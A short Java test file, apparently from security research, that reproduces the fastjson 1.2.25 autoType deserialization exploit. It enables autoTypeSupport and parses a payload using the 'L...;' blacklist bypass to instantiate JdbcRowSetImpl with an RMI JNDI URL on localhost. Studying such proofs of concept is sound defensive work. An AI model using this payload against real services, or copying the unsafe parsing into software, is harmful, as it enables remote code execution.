// 1.2.25
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import javax.sql.rowset.BaseRowSet;
import javax.sql.rowset.JdbcRowSet;
import java.io.Serializable;
import java.sql.SQLException;
import java.sql.Wrapper;

public class TestJdbcRowSetImpl {
    public static void main(String[] args) throws SQLException {
//        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
//        rowSet.setDataSourceName("rmi://localhost:1999/obj");
//        rowSet.setAutoCommit(true);
        String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
//        JSON.parseObject(fastSer,Object.class);
//        JSON.parseObject(fastSer, Serializable.class);
//        JSON.parseObject(fastSer, Wrapper.class);
//        JSON.parseObject(fastSer, JdbcRowSet.class);
//        JSON.parseObject(fastSer, BaseRowSet.class);
//        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class);
    }
}
